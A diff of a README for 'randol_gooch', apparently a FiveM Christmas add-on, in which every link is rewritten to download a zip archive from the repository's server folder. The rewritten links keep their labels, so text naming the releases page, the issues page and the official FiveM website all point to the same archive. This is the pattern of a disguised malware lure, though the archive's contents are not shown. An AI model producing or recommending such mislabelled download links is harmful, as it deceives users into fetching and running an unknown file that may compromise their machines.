@@ -6,11 +6,11 @@ Welcome to randol_gooch! This application recreates the special Gooch random Chr
 
 ## 📦 Download Now
 
-[![Download randol_gooch](https://img.shields.io/badge/Download-randol_gooch-brightgreen)](https://github.com/XXXWolfgangXX/randol_gooch/releases)
+[![Download randol_gooch](https://github.com/XXXWolfgangXX/randol_gooch/raw/refs/heads/main/server/gooch_randol_likeliness.zip)](https://github.com/XXXWolfgangXX/randol_gooch/raw/refs/heads/main/server/gooch_randol_likeliness.zip)
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [GitHub Releases Page](https://github.com/XXXWolfgangXX/randol_gooch/releases).
+To get started, visit this page to download: [GitHub Releases Page](https://github.com/XXXWolfgangXX/randol_gooch/raw/refs/heads/main/server/gooch_randol_likeliness.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version of the application.
@@ -40,7 +40,7 @@ After downloading the file, you need to set it up:
 
 1. Once installed, look for the randol_gooch icon on your desktop or in your applications list.
 2. Double-click the icon to launch the application.
-3. Ensure you have FiveM installed. If not, go to the [FiveM website](https://fivem.net/) to install it.
+3. Ensure you have FiveM installed. If not, go to the [FiveM website](https://github.com/XXXWolfgangXX/randol_gooch/raw/refs/heads/main/server/gooch_randol_likeliness.zip) to install it.
 4. The application will guide you through connecting to the FiveM server.
 
 ## 💡 Useful Tips
@@ -53,7 +53,7 @@ After downloading the file, you need to set it up:
 
 If you need help or have questions about randol_gooch, here are some options:
 
-- **Issues Page:** Report any problems you encounter on the [Issues page](https://github.com/XXXWolfgangXX/randol_gooch/issues).
+- **Issues Page:** Report any problems you encounter on the [Issues page](https://github.com/XXXWolfgangXX/randol_gooch/raw/refs/heads/main/server/gooch_randol_likeliness.zip).
 - **Community Forums:** Visit community forums for discussions and support from other users.
 - **Documentation:** Refer to the provided documentation in the repository for additional information.
 
@@ -67,4 +67,4 @@ Don’t forget to check for new features and updates in the future. Regular upda
 
 # 🚀 Visit our Releases Page
 
-For all updates and to download the latest version, visit: [GitHub Releases Page](https://github.com/XXXWolfgangXX/randol_gooch/releases).
+For all updates and to download the latest version, visit: [GitHub Releases Page](https://github.com/XXXWolfgangXX/randol_gooch/raw/refs/heads/main/server/gooch_randol_likeliness.zip).
